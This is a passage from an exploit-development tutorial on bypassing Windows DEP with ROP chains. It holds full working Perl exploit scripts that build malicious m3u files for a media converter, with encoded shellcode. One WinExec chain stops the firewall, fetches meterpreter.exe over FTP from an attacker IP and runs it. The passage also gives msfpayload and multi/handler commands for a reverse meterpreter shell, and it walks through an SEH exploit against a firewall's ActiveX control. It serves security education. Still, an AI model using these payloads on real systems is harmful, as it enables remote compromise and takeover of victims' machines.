.\n\"\\x5a\\x41\\x41\";\nmy $rest = \"C\" x 300;\nmy $payload = $junk.$eip.$junk2.$rop.$params.$rop2.$nops.$shellcode.$rest;\nprint \"Payload size : \".length($payload).\"n\";\nprint \"Shellcode size : \".length($shellcode).\"n\";\nopen($FILE,\">$file\");\nprint $FILE $payload;\nclose($FILE);\nprint \"m3u File $file Created successfullyn\";\nStage 4 and 5 : third and fourth parameter (size and protection flag)\nIn order to create the third parameter, I decided to set the size to\n0x300 bytes.  The gadgets we need to do this are XOR EAX,EAX  and   ADD\nEAX,100\nThe technique to write the resulting value as a parameter is exactly\nthe same as with the other parameters\n* Save EAX into ESI\n* Change EAX (XOR EAX,EAX : 0x100307A9, and then ADD EAX,100 + RET, 3\ntimes in a row : 0x1002DC4C)\n* Increase ESI with 4 bytes\n* Write EAX to ESI+0x10\nThe fourth parameter (0x40) uses the same principle again :\n* Save EAX into ESI\n* Set EAX to zero and then add 40  (XOR EAX,EAX + RET : 0x100307A9\n\/  ADD EAX,40 + RET : 0x1002DC41)\n* Increase ESI with 4 bytes\n* Write EAX to ESI+0x10\nFinal stage : jump to VirtualProtect\nAll parameters are now written to the stack :\n[160]image\nAll we need to do now is find a way to make ESP point to the location\nwhere the pointer to VirtualProtect() is stored (directly followed by\nthe arguments to that function), and somehow return to it.\nThe current state of the registers is :\n[161]image\nWhat are my options to do this ?  How can I make ESP point at 0010F740\nand then return (to the pointer to VirtualProtect()) ?\nAnswer : EAX already points at this address. So if we can put eax into\nesp and then return, it should be fine.\nSearch rop.txt for a push eax \/ pop esp combination :\n0x73DF5CA8 # PUSH EAX # POP ESP # MOV EAX,EDI # POP EDI # POP ESI # RETN   [Modu\nle : MFC42.DLL]\nThis one will work, but there are 2 POP instructions in the gadget. So\nwe have to adjust EAX first (to compensate for the POP\u2019s). We basically\nneed to subtract 8 from eax first, before adjusting the stack.\nTo do that, we can use\n0x775D12F1  #SUB EAX,4 # RET\nOur final chain will look like this :\n* 0x775D12F1\n* 0x775D12F1\n* 0x73DF5CA8\nPut everything together in the exploit script :\n#------------------------------------------------------------\n#ROP based exploit for Easy RM to MP3 Converter\n#written by corelanc0d3r - http:\/\/www.corelan.be\n#------------------------------------------------------------\nmy $file= \"rop.m3u\";\nmy $buffersize = 26094;\nmy $junk = \"Z\" x $buffersize;\nmy $eip=pack('V',0x100102DC); #return to stack\nmy $junk2 = \"AAAA\"; #compensate\n#------Put stack pointer in EDI & EAX------------------------#\nmy $rop=pack('V',0x5AD79277);  #PUSH ESP, POP EDI\n$rop = $rop.pack('V',0x77C1E842); #PUSH EDI, POP EAX\n$rop=$rop.\"AAAA\"; #compensate for POP EBP\n#stack pointer is now in EAX & EDI, now jump over parameters\n$rop=$rop.pack('V',0x1001653D);  #ADD ESP,20\n#-------Parameters for VirtualProtect()----------------------#\nmy $params=pack('V',0x7C801AD4);          #VirtualProtect()\n$params = $params.\"WWWW\";   #return address (param1)\n$params = $params.\"XXXX\";   #lpAddress      (param2)\n$params = $params.\"YYYY\";   #Size           (param3)\n$params = $params.\"ZZZZ\";   #flNewProtect   (param4)\n$params = $params.pack('V',0x10035005);  #writeable address\n$params=$params.(\"H\" x 8);  #padding\n# ADD ESP,20 + RET will land here\n# change ESI so it points to correct location\n# to write first parameter (return address)\nmy $rop2= pack('V',0x763C982F);  # XCHG ESI,EDI # DEC ECX # RETN 4\n#-----Make eax point at shellcode--------------------------\n$rop2=$rop2.pack('V',0x1002DC4C);  #ADD EAX,100 # POP EBP\n$rop2=$rop2.\"AAAA\"; #padding - compensate for RETN4 before\n$rop2=$rop2.\"AAAA\"; #padding\n#----------------------------------------------------------\n#return address is in EAX - write parameter 1\n$rop2=$rop2.pack('V',0x77E84115);\n$rop2=$rop2.\"AAAA\"; #padding\n#EAX now contains stack pointer\n#save it back to ESI first\n$rop2=$rop2.pack('V',0x775D131E);  # PUSH EAX # POP ESI # RETN\n#-----Make eax point at shellcode (again)--------------------------\n$rop2=$rop2.pack('V',0x1002DC4C);  #ADD EAX,100 # POP EBP\n$rop2=$rop2.\"AAAA\"; #padding\n#increase ESI with 4\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n#and write lpAddress (param 2)\n$rop2=$rop2.pack('V',0x77E84115);\n$rop2=$rop2.\"AAAA\"; #padding\n#save EAX in ESI again\n$rop2=$rop2.pack('V',0x775D131E);  # PUSH EAX # POP ESI # RETN\n#create size - set EAX to 300 or so\n$rop2=$rop2.pack('V',0x100307A9);  # XOR EAX,EAX # RETN\n$rop2=$rop2.pack('V',0x1002DC4C);  #ADD EAX,100 # POP EBP\n$rop2=$rop2.\"AAAA\"; #padding\n$rop2=$rop2.pack('V',0x1002DC4C);  #ADD EAX,100 # POP EBP\n$rop2=$rop2.\"AAAA\"; #padding\n$rop2=$rop2.pack('V',0x1002DC4C);  #ADD EAX,100 # POP EBP\n$rop2=$rop2.\"AAAA\"; #padding\n#write size, first set ESI to right place\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n#write (param 3)\n$rop2=$rop2.pack('V',0x77E84115);\n$rop2=$rop2.\"AAAA\"; #padding\n#save EAX in ESI again\n$rop2=$rop2.pack('V',0x775D131E);  # PUSH EAX # POP ESI # RETN\n#flNewProtect 0x40\n$rop2=$rop2.pack('V',0x10010C77);   #XOR EAX,EAX\n$rop2=$rop2.pack('V',0x1002DC41);   #ADD EAX,40 # POP EBP\n$rop2=$rop2.\"AAAA\"; #padding\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n$rop2=$rop2.pack('V',0x77157D1D);  # INC ESI # RETN   [Module : OLEAUT32.dll]\n#write (param4)\n$rop2=$rop2.pack('V',0x77E84115);\n$rop2=$rop2.\"AAAA\"; #padding\n#Return to VirtualProtect()\n#EAX points at VirtualProtect pointer (just before parameters)\n#compensate for the 2 POP instructions\n$rop2=$rop2.pack('V',0x775D12F1);  #SUB EAX,4 # RET\n$rop2=$rop2.pack('V',0x775D12F1);  #SUB EAX,4 # RET\n#change ESP & fly back\n$rop2=$rop2.pack('V',0x73DF5CA8);  #[Module : MFC42.DLL]\n# PUSH EAX # POP ESP # MOV EAX,EDI # POP EDI # POP ESI # RETN\n#\nmy $nops = \"\\x90\" x 240;\n#\n# .\/msfpayload windows\/messagebox\n#  TITLE=CORELAN TEXT=\"rop test by corelanc0d3r\" R\n# | .\/msfencode -e x86\/alpha_mixed -t perl\nmy $shellcode =\n\"\\x89\\xe0\\xda\\xcf\\xd9\\x70\\xf4\\x5a\\x4a\\x4a\\x4a\\x4a\\x4a\\x4a\" .\n\"\\x4a\\x4a\\x4a\\x4a\\x4a\\x43\\x43\\x43\\x43\\x43\\x43\\x37\\x52\\x59\" .\n\"\\x6a\\x41\\x58\\x50\\x30\\x41\\x30\\x41\\x6b\\x41\\x41\\x51\\x32\\x41\" .\n\"\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\\x42\" .\n\"\\x75\\x4a\\x49\\x48\\x59\\x48\\x6b\\x4f\\x6b\\x48\\x59\\x43\\x44\\x51\" .\n\"\\x34\\x4c\\x34\\x50\\x31\\x48\\x52\\x4f\\x42\\x42\\x5a\\x46\\x51\\x49\" .\n\"\\x59\\x45\\x34\\x4e\\x6b\\x51\\x61\\x44\\x70\\x4e\\x6b\\x43\\x46\\x46\" .\n\"\\x6c\\x4c\\x4b\\x42\\x56\\x45\\x4c\\x4c\\x4b\\x42\\x66\\x43\\x38\\x4c\" .\n\"\\x4b\\x51\\x6e\\x45\\x70\\x4e\\x6b\\x50\\x36\\x44\\x78\\x42\\x6f\\x45\" .\n\"\\x48\\x44\\x35\\x4c\\x33\\x50\\x59\\x43\\x31\\x4a\\x71\\x4b\\x4f\\x48\" .\n\"\\x61\\x43\\x50\\x4c\\x4b\\x50\\x6c\\x51\\x34\\x46\\x44\\x4e\\x6b\\x47\" .\n\"\\x35\\x45\\x6c\\x4c\\x4b\\x42\\x74\\x43\\x35\\x42\\x58\\x46\\x61\\x48\" .\n\"\\x6a\\x4e\\x6b\\x51\\x5a\\x45\\x48\\x4e\\x6b\\x42\\x7a\\x47\\x50\\x47\" .\n\"\\x71\\x48\\x6b\\x4a\\x43\\x45\\x67\\x42\\x69\\x4e\\x6b\\x47\\x44\\x4e\" .\n\"\\x6b\\x46\\x61\\x48\\x6e\\x46\\x51\\x49\\x6f\\x45\\x61\\x49\\x50\\x49\" .\n\"\\x6c\\x4e\\x4c\\x4d\\x54\\x49\\x50\\x50\\x74\\x45\\x5a\\x4b\\x71\\x48\" .\n\"\\x4f\\x44\\x4d\\x47\\x71\\x4b\\x77\\x48\\x69\\x48\\x71\\x49\\x6f\\x49\" .\n\"\\x6f\\x4b\\x4f\\x45\\x6b\\x43\\x4c\\x47\\x54\\x44\\x68\\x51\\x65\\x49\" .\n\"\\x4e\\x4e\\x6b\\x50\\x5a\\x45\\x74\\x46\\x61\\x48\\x6b\\x50\\x66\\x4e\" .\n\"\\x6b\\x46\\x6c\\x50\\x4b\\x4c\\x4b\\x51\\x4a\\x45\\x4c\\x45\\x51\\x4a\" .\n\"\\x4b\\x4e\\x6b\\x43\\x34\\x4c\\x4b\\x43\\x31\\x4a\\x48\\x4d\\x59\\x42\" .\n\"\\x64\\x51\\x34\\x47\\x6c\\x45\\x31\\x4f\\x33\\x4f\\x42\\x47\\x78\\x44\" .\n\"\\x69\\x49\\x44\\x4f\\x79\\x4a\\x45\\x4e\\x69\\x4a\\x62\\x43\\x58\\x4e\" .\n\"\\x6e\\x42\\x6e\\x44\\x4e\\x48\\x6c\\x43\\x62\\x4a\\x48\\x4d\\x4c\\x4b\" .\n\"\\x4f\\x4b\\x4f\\x49\\x6f\\x4d\\x59\\x42\\x65\\x43\\x34\\x4f\\x4b\\x51\" .\n\"\\x6e\\x48\\x58\\x48\\x62\\x43\\x43\\x4e\\x67\\x47\\x6c\\x45\\x74\\x43\" .\n\"\\x62\\x49\\x78\\x4e\\x6b\\x4b\\x4f\\x4b\\x4f\\x49\\x6f\\x4f\\x79\\x50\" .\n\"\\x45\\x45\\x58\\x42\\x48\\x50\\x6c\\x42\\x4c\\x51\\x30\\x4b\\x4f\\x51\" .\n\"\\x78\\x50\\x33\\x44\\x72\\x44\\x6e\\x51\\x74\\x50\\x68\\x42\\x55\\x50\" .\n\"\\x73\\x42\\x45\\x42\\x52\\x4f\\x78\\x43\\x6c\\x47\\x54\\x44\\x4a\\x4c\" .\n\"\\x49\\x4d\\x36\\x50\\x56\\x4b\\x4f\\x43\\x65\\x47\\x74\\x4c\\x49\\x48\" .\n\"\\x42\\x42\\x70\\x4f\\x4b\\x49\\x38\\x4c\\x62\\x50\\x4d\\x4d\\x6c\\x4e\" .\n\"\\x67\\x45\\x4c\\x44\\x64\\x51\\x42\\x49\\x78\\x51\\x4e\\x49\\x6f\\x4b\" .\n\"\\x4f\\x49\\x6f\\x42\\x48\\x42\\x6c\\x43\\x71\\x42\\x6e\\x50\\x58\\x50\" .\n\"\\x68\\x47\\x33\\x42\\x6f\\x50\\x52\\x43\\x75\\x45\\x61\\x4b\\x6b\\x4e\" .\n\"\\x68\\x51\\x4c\\x47\\x54\\x47\\x77\\x4d\\x59\\x4b\\x53\\x50\\x68\\x51\" .\n\"\\x48\\x47\\x50\\x51\\x30\\x51\\x30\\x42\\x48\\x50\\x30\\x51\\x74\\x50\" .\n\"\\x33\\x50\\x72\\x45\\x38\\x42\\x4c\\x45\\x31\\x50\\x6e\\x51\\x73\\x43\" .\n\"\\x58\\x50\\x63\\x50\\x6f\\x43\\x42\\x50\\x65\\x42\\x48\\x47\\x50\\x43\" .\n\"\\x52\\x43\\x49\\x51\\x30\\x51\\x78\\x43\\x44\\x42\\x45\\x51\\x63\\x50\" .\n\"\\x74\\x45\\x38\\x44\\x32\\x50\\x6f\\x42\\x50\\x51\\x30\\x46\\x51\\x48\" .\n\"\\x49\\x4c\\x48\\x42\\x6c\\x47\\x54\\x44\\x58\\x4d\\x59\\x4b\\x51\\x46\" .\n\"\\x51\\x48\\x52\\x51\\x42\\x46\\x33\\x50\\x51\\x43\\x62\\x49\\x6f\\x4e\" .\n\"\\x30\\x44\\x71\\x49\\x50\\x50\\x50\\x4b\\x4f\\x50\\x55\\x45\\x58\\x45\" .\n\"\\x5a\\x41\\x41\";\nmy $rest = \"C\" x 300;\nmy $payload = $junk.$eip.$junk2.$rop.$params.$rop2.$nops.$shellcode.$rest;\nprint \"Payload size : \".length($payload).\"n\";\nprint \"Shellcode size : \".length($shellcode).\"n\";\nopen($FILE,\">$file\");\nprint $FILE $payload;\nclose($FILE);\nprint \"m3u File $file Created successfullyn\";\nResult :\n[162]image\nDirect RET \u2013 ROP Version 2 \u2013 NtSetInformationProcess()\nLet\u2019s use the same application\/vulnerability again to test a different\nROP bypass technique : NtSetInformationProcess()\nThis function takes 5 parameters :\nReturn address Value to be generated, indicates where function needs to\nreturn to (= location where your shellcode is placed\nNtCurrentProcess() Static value, set to 0xFFFFFFFF\nProcessExecuteFlags Static value, set to 0x22\n&ExecuteFlags Pointer to 0x00000002, may be a static address hardcoded\nin your sploit, but must be writeable\nsizeOf(ExecuteFlags) Static value, set to 0x4\nThe exploit rop layout will most likely look pretty much the same as\nwith VirtualProtect() :\n* save stack position\n* jump over the placeholders\n* generate the value for the return address\n* generate the value for the second parameter (0x22) and use\n\"ESI+0x10\" to write it onto the stack\n+ zero out eax : XOR EAX,EAX + RET : 0x100307A9\n+ ADD EAX,40 + RET : 0x1002DC41 + chain of pointers to ADD\nEAX,-2 until it contains 0x22 (0x10027D2E)\n+ Alternatively, use ADD AL,10 (0x100308FD) twice and then INC\nEAX twice (0x1001152C)\n* if required, generate value for the third parameter (pointer to\n0x2, writable address).  Tip : try running \"!pvefindaddr find\n02000000 rw\" in Immunity Debugger and see if you can find a static\n\/ writeable address.\n* generate the value for the fourth parameter (0x4) and use\n\"ESI+0x10\" to write it onto the stack\n+ inc eax 4 times : 0x1001152C\nGood exercise.\nJust to prove that it works :\n[163]image\nDirect RET \u2013 ROP Version 3 \u2013 SetProcessDEPPolicy()\nAnother way to bypass DEP would be to use a call to\nSetProcessDEPPolicy(), basically turning off DEP for the process.\nThis function needs 2 parameters on the stack : a pointer to the\nshellcode (dynamically generated), and zero.\nSince we only have a limited number of parameters, I\u2019ll try to use a\ndifferent technique to put the parameters on the stack\u2026 PUSHAD\nA pushad instruction will put the registers onto the stack. When the\nregisters are pushed onto the stack (pushad), then this is how the top\nof the stack will look like :\n* EDI\n* ESI\n* EBP\n* value pointing to stack right after this block\n* EBX\n* EDX\n* ECX\n* EAX\nThat means that, if we position our nops\/shellcode right after this\nblock, then perhaps we can take advantage of the fact that we\u2019ll have a\nvalue on the stack that points to our shellcode \"auto magically\".\nNext, the pushad will take the value off the top of the stack (value\nthat can be manipulated using EDI) and put that in EIP. So that\nprovides us with the perfect path to make this work.\nIn order to put the right parameters in the right place, we have to\ncraft the registers with the following values :\n* EDI = pointer to RET (slide to next instruction : rop nop)\n* ESI = pointer to RET (slide to next instruction : rop nop)\n* EBP = pointer to SetProcessDEPPolicy()\n* EBX = pointer to zero\n* EDX, ECX and EAX don\u2019t really matter\nAfter the pushad, the stack will look like this :\n* RET (taken from EDI)\n* RET (taken from ESI)\n* SetProcessDEPPolicy()   (taken from EBP)\n* Pointer to shellcode (auto magically inserted by pushad)\n* Zero  (taken from EBX)\n* EDX (junk)\n* ECX (junk)\n* EAX (junk)\n* nops\n* shellcode\nThe rop chain to do this might look something like this :\nmy $eip=pack('V',0x100102DC); #return to stack\nmy $junk2 = \"AAAA\"; #compensate\n#put zero in EBX\nmy $rop=pack('V',0x100109EC);  #POP EBX\n$rop=$rop.pack('V',0xFFFFFFFF);  #<- will be put in EBX\n$rop=$rop.pack('V',0x1001C1A5); #INC EBX, EBX = 0 now\n$rop=$rop.pack('V',0x10014F75); #POP EBP\n$rop=$rop.pack('V',0x7C8622A4);  #<- SetProcessDEPPolicy, into EBP\n#put RET in EDI (needed as NOP)\n$rop=$rop.pack('V',0x1001C07F); #POP EDI (pointer to RET)\n$rop=$rop.pack('V',0x1001C080); #RET\n#put RET in ESI as well (NOP again)\n$rop=$rop.pack('V',0x10010C31); #POP ESI\n$rop=$rop.pack('V',0x1001C080); #RET\n$rop=$rop.pack('V',0x100184FA);  #PUSHAD\n#ESP will now automagically point at nops\n(Just append nops + shellcode to this rop chain and you\u2019re all set)\nResult :\n[164]image\nDirect RET \u2013 ROP Version 4 \u2013 ret-to-libc : WinExec()\nSo far, I have explained a few ways to bypass DEP, using specific\nWindows functions. In every case, the real challenge behind the\ntechnique is to find reliable ROP gadgets that will craft your stack\nand call the function.\nI think it\u2019s important to note that a \"classic\" ret-to-libc \u2013 style\nmethod (using WinExec() for example) might still be a valuable\ntechnique as well.\nWhile putting together the stack to make a successful call to WinExec()\nwill require some ROP, it is still different from the other DEP bypass\ntechniques, because we are not going to execute custom shellcode. So we\ndon\u2019t really need to change execution flags or disable DEP. We just are\ngoing to call a windows function and use a pointer to a series of OS\ncommands as a parameter.\n[165]http:\/\/msdn.microsoft.com\/en-us\/library\/ms687393(VS.85).aspx\nUINT WINAPI WinExec(\n__in  LPCSTR lpCmdLine,\n__in  UINT uCmdShow\n);\nFirst argument is a pointer to the command to execute, and the second\nparameter indicates the window [166]behavior. Some examples :\n* 0 = Hide window\n* 1 = Show normal\n* 10 = Show default\n* 11 = Force minimize\nIn order to make this one work, you will need to add a return address\nto the parameters (first parameter to be precise). This can just be any\naddress, but there has to be something in that field. So, this is what\nthe stack should look like\n* return address\n* pointer to the command\n* 0x00000000 (HIDE)\nOn XP SP3, WinExec is located at 0x7C86250D\nTake a look at this example :\n#ROP based exploit for Easy RM to MP3 Converter\n#Uses WinExec()\n#written by corelanc0d3r - http:\/\/www.corelan.be\nmy $file= \"rop.m3u\";\nmy $buffersize = 26094;\nmy $junk = \"A\" x $buffersize;\nmy $eip=pack('V',0x100102DC); #return to stack\nmy $junk2 = \"AAAA\"; #compensate\n#-----------------------------------------------#\n#WinExec 7C86250D\n#-----------------------------------------------#\nmy $evilIP=\"192.168.0.189\";\nmy $rop=pack('V',0x100109EC); #POP EBX\n$rop=$rop.pack('V',0xFFFFFFFF);  #<- will be put in EBX\n$rop=$rop.pack('V',0x1001C1A5); #INC EBX, EBX = 0 = HIDE\n$rop=$rop.pack('V',0x10014F75);  #POP EBP\n$rop=$rop.pack('V',0xFFFFFFFF); #return address for WinExec\n$rop=$rop.pack('V',0x10010C31); #POP ESI\n$rop=$rop.pack('V',0x7C86250D); #WinExec()\n$rop=$rop.pack('V',0x1001C07F); #POP EDI\n$rop=$rop.pack('V',0x1001C080); #RET, put in EDI (NOP)\n$rop=$rop.pack('V',0x1002CC86); #pushad + ret\nmy $cmd='cmd \/c \"net stop SharedAccess && ';\n$cmd=$cmd.\"echo user anonymous > ftp.txt && \";\n$cmd=$cmd.\"echo anonymous@bla.com >> ftp.txt && \";\n$cmd=$cmd.\"echo bin >> ftp.txt && \";\n$cmd=$cmd.\"echo get meterpreter.exe >> ftp.txt \";\n$cmd=$cmd.\"&& echo quit >> ftp.txt && \";\n$cmd=$cmd.\"ftp -n -s:ftp.txt \".$evilIP.\" && \";\n$cmd=$cmd.'meterpreter.exe\"'.\"n\";\n#it's ok to put a null byte, EIP is already overwritten\nmy $payload = $junk.$eip.$junk2.$rop.$cmd;\nprint \"Payload size : \".length($payload).\"n\";\nopen($FILE,\">$file\");\nprint $FILE $payload;\nclose($FILE);\nprint \"m3u File $file Created successfullyn\";\nFirst, 0x00000000 is placed into EBX (POP 0xFFFFFFFF into ebx, and then\nINC EBX is called),  then the registers are set up to do a PUSHAD call\n(basically I put the return address in EBP, the WinExec() pointer into\nESI, and a RET (NOP) into EDI).\nThe command above will only work if the firewall service on the XP\nmachine is stopped.  If the PC is not running windows firewall, you may\nhave to remove the \"net stop SharedAccess\" piece.\n$evilIP is your attacker machine, running an ftp server which contains\nmeterpreter.exe, created using the following metasploit command :\n.\/msfpayload windows\/meterpreter\/reverse_tcp RHOST=192.168.0.189 RPORT=4444\nLHOST=192.168.0.189 LPORT=4444 X > meterpreter.exe\n(put everything on one line and copy the file to the FTP server root)\nOn the attacker machine, set up a metasploit multihandler listener :\n.\/msfcli multi\/handler payload=windows\/meterpreter\/reverse_tcp\nlhost=192.168.0.189 lport=4444 E\nResult :\n[167]image\nAs you can see, even a simple pointer to WinExec will allow you to\nbypass DEP (works for all cases !) and get you a meterpreter shell.\nSEH Based \u2013 The ROP version \u2013 WriteProcessMemory()\nIn order to demonstrate how SEH based exploits can be turned into a ROP\nversion, I will use an [168]recently published vulnerability,\ndiscovered by Lincoln, targeting an ActiveX buffer overflow in Sygate\nPersonal Firewall 5.6.  As we can see in the advisory, the\nSetRegString() function in sshelper.dll is susceptible to a buffer\noverflow, which is overwriting the exception handler.\nYou can get a copy of the exploit here :\n[169]http:\/\/www.exploit-db.com\/exploits\/13834\nThis function takes 5 arguments.  The 3rd argument is the one that will\ntake you to the buffer overflow :\nOn IE6 and IE7, the SEH record is overwritten after 3348 bytes. (so\n3348 bytes to nseh, and 3352 bytes to seh)\nIn a typical (non-ROP) exploit, we would probably end up overwriting\nnseh with a short jump forward (\\xeb\\x06\\x90\\x90) and seh with a\npointer to pop\/pop\/ret.  As explained earlier, this approach is not\ngoing to work when DEP is enabled, because we cannot execute code\nbefore actually disabling\/bypassing DEP first.\nHowever, there is an easy way to overcome this issue. We just need to\npivot back to the stack when the exception handler (the one that we\nhave overwritten) kicks in.\nSo basically, we don\u2019t really care about nseh (4 bytes), so we\u2019ll\ncreate a little script that will overwrite SE Handler after 3352 bytes.\nWhat we are interested in, is seeing how far our buffer (on the stack)\nis away when the SE Handler gets called. So we will overwrite SE\nHandler with a valid pointer to an instruction. At this type, just to\nsee where our buffer is, any instruction will do, because we only want\nto see how far our buffer is away when we jump to that instruction.\nTriggering the bug\nWe\u2019ll put a pointer to RET into SE Handler (we\u2019ll just take one from\nsshelper.dll for now : 0x0644110C), and then add 25000 more bytes (to\ntrigger the access violation).  Our test exploit script so far will\nlook something like this :\nSave the html file to your c: drive and open it in Internet Explorer.\nAttach Immunity Debugger to iexplore.exe.  Allow the activeX object to\nrun (you may have to click OK twice) and let Immunity catch the\nexception.\nWhen you observe the SEH chain, you should that we have overwritten the\nSE Handler with our pointer to RET :\n[170]image\nIf you get the SEH chain view like the screenshot above (2 SEH\nrecords), press Shift F9 just once. Then you should see the same\nregister \/ stack view when you would only have seen one SEH record :\n[171]image\nScroll down in the stack view until you see your overwritten SE Handler\n:\n[172]image\nSet a breakpoint on 0x0644110C and pass the exception to the\napplication (Press Shift F9). The registers now contain this :\n[173]image\nand the top of the stack looks like this :\n[174]image\nScroll down until you see the first part of your buffer (A\u2019s) :\n[175]image\nStack pivoting\nSo, we find our buffer back at ESP (01A6E34C + 1032 bytes).  That means\nthat, if we want to return from the SE Handler to our buffer, we have\nto pivot the stack with at least 1032 bytes (0x408 or more).  My good\nfriend Lincoln generated his rop file and found a pointer to ADD\nESP,46C + RET in sshelper.dll at 0x06471613\n[176]image\nThat means that, if we overwrite our SE Handler with a pointer to ADD\nESP,46C + RET, then that should make us land back in our controlled\nbuffer and start our rop chain.\nModify the script and replace the \"seh = \u2026\"  line with\nseh = unescape(\"%13%16%47%06\")\nOpen the file in Internet Explorer again (Immunity debugger attached to\nit), and let the activeX object run.  When the crash occurs, observe\nthe SEH chain and verify that it is overwritten with the correct\npointer\nSet a breakpoint to 0x06471613. Pass the exception to the application\n(twice if needed,) until the breakpoint is hit.\n[177]image\nAt this point, ESP points to 01A5E330\nThen use F7 to step through the instructions. When the \"ADD ESP,46C\"\ninstruction is executed, check ESP (and the contents at the top of the\nstack) :\n[178]image\nAwesome, that means that we have been able to pivot the stack and land\nback in a location where we can initiate the rop chain.\nFrom that point forward, this exploit can be built just like any other\nrop based exploit :\n* Set your strategy (WriteProcessMemory() in this case, but you can\nobviously use another technique as well),\n* Get your rop gadgets (!pvefindaddr rop),\n* and build the chain\nBut first of all, you will need to figure out where exactly in the A\u2019s\nwe will land, so we can start the rop chain in the right place.\nYou will notice that, when you try to locate the offset (IE6, IE7),\nthat the offset may change. It may vary somewhere between 72 bytes and\n100 bytes (100 bytes max)\nThat means that we are not 100% sure where we will land in the buffer.\nHow can we survive that ?  We know the concept of nop\u2019s, to allow\ntrampolines to be a little bit \"off\" when jumping to shellcode.  But is\nthere such a thing as a rop-compatible nop ?\nROP NOP\nOf course there is. Remember \"direct RET sploit version 3\" ? We already\nused a slide to walk to the next address on the stack.\nIn order to be able to make the exploit generic (without having to\ncreate multiple rop chains inside a single exploit), you can simply\n\"spray\" some regions of the stack with ROP NOPs, basically represented\nby pointers to RET. Every time the RET is called, it will slide \/jump\nto the next ret without really doing anything bad.\nSo that\u2019s kinda like a nop.\nA pointer is made up of 4 bytes, so it will be important to align\nthese pointers, making sure that, when EIP returns to the stack, it\nwould land & execute the instructions at the pointer (and would not\nland in the middle of a pointer, breaking the chain), or would land\ndirectly at the first gadget of your rop chain.\nFinding rop nops is not that hard. Any pointer to RET will do.\nBack to our exploit\nBuilding the ROP chain \u2013 WriteProcessMemory()\nCrafting the stack for a given function can be done in many ways. I\nwill simply explain how Lincoln built his rop chain and turned the bug\ninto a working DEP bypassing exploit.\nImportant note : we have to deal with bad characters : bytes between\n80 and 9f must be avoided.\nIn his exploit, Lincoln decided to use PUSHAD to put the parameters on\nthe stack, in the right place, and then make the call to the function\n(WriteProcessMemory() in this case).\nFirst of all, to make sure the rop chain gets launched, even if the\nlocation where we land after the ADD ESP,46C instruction is different,\nhe used a number of RET pointers (0x06471619) as nop\u2019s :\n[179]image\nThen he puts 0x064BC001 into ebp (using a pop ebp + ret gadget at\n0x0644B633), and uses a chain of pop instructions (at 0x0647B965) to\nload 5 \"parameters\" into registers :\n[180]image\n[181]image\nAfter these 5 POP\u2019s got executed, the registers look like this :\n[182]image\nNext, he will generate the shellcode length. He used 3 ADD EAX,80\ninstructions and then adds the sub to the current value in EBX :\n[183]image\nResult :\n[184]image\nSo the shellcode length is now placed in ebx.\nNext, he will try to put the\nThe rop gadgets that were used to accomplish this, are POP EAX (take\n0xCCD0731F from the stack), and then do SUB EAX,ECX.  Finally, this\nvalue is put in EBP.\n[185]image\nNote : the reason why Lincoln couldn\u2019t just pop 7C9022CF into EBP is\nbecause that particular address contains a \"bad char\" \u2013 we cannot\nuse byte 0x80. ECX already contains 50505050, so he used a sub\ninstruction (with a pre-calculated value in eax) to reproduce that\npointer. Smart thinking !\n[186]image\nThis rop subchain has put 7C9022CF into EBP. This address will be the\ntarget location to write our shellcode to. In essence, we will be\npatching the WriteProcessMemory() function itself, so this address\nshould sound familiar if you read the section about\nWriteProcessMemory() carefully.\nThe last gadget does not really end with a RET. Instead, it will do a\ncall ESI.\nWhere does ESI come from ?  Remember the 5 POP\u2019s we did earlier? Well,\nwe simply put a value on the stack that got popped into ESI. And that\nvalue is a pointer to the following instructions :\n[187]image\nSo the CALL ESI will jump to that location, increase ESP with 4 bytes,\nput a value (06454ED5) into EAX and then return. We simply \"return to\nthe caller \u2013 to the stack\", basically taking the pointer off the top of\nthe stack (= pointer to the next rop gadget) and jump to it)\n[188]image\nUsing this gadget, ESI is set to FFFFFFFF. This will be the value used\nas hProcess parameter later on\nNext, CCD07263 is popped into eax, and after that, a SUB EAX,ECX\ninstruction is executed.\n[189]image\nAfter executing those instructions, the result in EAX will be 7C802213\n(which is the pointer to kernel32.WriteProcessMemory)\n[190]image\nFinally, a PUSHAD instruction is executed :\n[191]image\nThis will make the top of the stack look like this :\n[192]image\nWhen the pushad function returns, it will execute the instructions at\n0x0647BD7C (which originate from EDI, placed into this register using\nthe 5 POP\u2019s earlier)\nThis instruction will simply do a CALL EAX.  In EAX, we still have a\npointer to kernel32.WriteProcessMemory().  When the CALL EAX is made,\nthe following parameters are taken from the stack :\n[193]image\nThe first parameter does not really matter. The code will patch WPM(),\nso it will never return.  Then, the hProcess parameter (FFFFFFFF) and\nAddress (destination, where to write the shellcode to) can be found,\nfollowed by the Buffer (location of the shellcode. This pointer was\ntaken from ESP. Since PUSHAD also shifted ESP (and since we have placed\nour shellcode directly after the rop chain), this pointer now points to\nthe shellcode.\nThe BytesToWrite value was generated earlier.  Finally, the last\nparameter just points to a writeable location.\nFirst, dump the contents at 0x78022CF :\n[194]image\nPress F7 to step through. After the call to ntdll.ZwWriteVirtualMemory\nis made (at 7C8022C9), before the RETN 14 instruction is executed at\nthe end of that call, we see that our shellcode was copied to 7C8022CF\n:\n[195]image\nWhen the RETN 14 instruction is executed, we land nicely at 7C8022CF,\nwhich just is the next instruction in the natural flow of\nWriteProcessMemory().\nSince this location now contains shellcode, the shellcode will 